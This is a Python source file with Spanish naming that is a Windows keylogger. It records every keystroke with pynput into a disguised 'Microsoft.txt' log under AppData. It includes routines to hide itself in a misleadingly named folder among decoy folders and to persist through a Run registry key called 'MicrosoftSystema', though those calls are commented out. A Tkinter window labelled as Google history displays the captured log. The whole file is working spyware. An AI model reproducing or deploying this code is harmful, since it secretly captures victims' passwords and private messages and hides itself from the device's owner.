try:
    import shutil  , socket
    from pynput import keyboard 
    import os , wmi , sys , subprocess
    import socket 
    from datetime import datetime
    import winreg
    import random , time
    from tkinter import filedialog
    from tkinter import *
    import threading
except:
    os.system("pip install pynput")
    os.system("pip install wmi")
    os.system("pip install datetime")
    os.system("pip install winreg")
    os.system("pip install shutil")


    


def cambiar_de_pocicion(lista = f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows" , nombre ="".join(os.path.splitext(os.path.basename(sys.argv[0])))):

    if os.path.exists(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\{nombre}"):
        pass
  
    else:
        os.mkdir(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows")
        
        shutil.move(os.path.abspath(sys.argv[0]), lista)
        
        for y in range(10):
            tupla=("Backups","Goals","Inspiration","Hobbies","Family","Templates","Research","Finances","Presentations","Reports")
            os.mkdir(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\{tupla[y]}")
            

#cambiar_de_pocicion()

def regis():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_WRITE)
        winreg.SetValueEx(key, "MicrosoftSystema", 0, winreg.REG_SZ, os.path.abspath(sys.argv[0]))
    except:
        pass

    winreg.CloseKey(key)


#regis()

def mostre():
    raiz = Tk()

    raiz.geometry("910x900")
    raiz.title("INFORMACION DE HISTORIAL DE GOOGLE")

    filename = filedialog.askopenfilename(initialdir=f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt",filetypes=(("Archivos de texto de Microsoft", "Microsoft.txt"),))

    if filename:
        scroll_bar = Scrollbar(raiz) 
        scroll_bar.pack(side = RIGHT, fill = Y ) 

        escritura = Text(raiz,width=9000,height=9000,bg="black",fg="yellow",font=("Georgia, 12"),yscrollcommand=scroll_bar.set)

        with open(filename,"rb") as g:
            escritura.insert(END, g.read().decode())
            scroll_bar.config(command=escritura.yview)
            escritura.pack()
    

    raiz.mainloop()
    
        
        
def prisionaerros(key):
    try:
        hora = datetime.now()
        texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
        txt = open(f"C:\\Users\\{os.getenv("UserName")}\\AppData\\LocalLow\\Arranque windows\\Microsoft.txt","a")#tenes que cambiar la ruta no te olvides de eso

        if key == keyboard.Key.f1:
            mostre()
            txt.write("EL GOOGLE SE DESACTIVO")
            return False
            
            

        elif key == keyboard.Key.space:
            txt.write(" ")
 

        elif key == keyboard.Key.enter:
            txt.write("\n" + "\n")
            txt.write("   " + texto)
            txt.write("\n" + "\n")
            
        txt.write(str(key.char))
        
         
    except AttributeError:
        pass


if __name__ == '__main__':
    with keyboard.Listener(on_press=prisionaerros) as comienzo:
        comienzo.join()
    
    
        
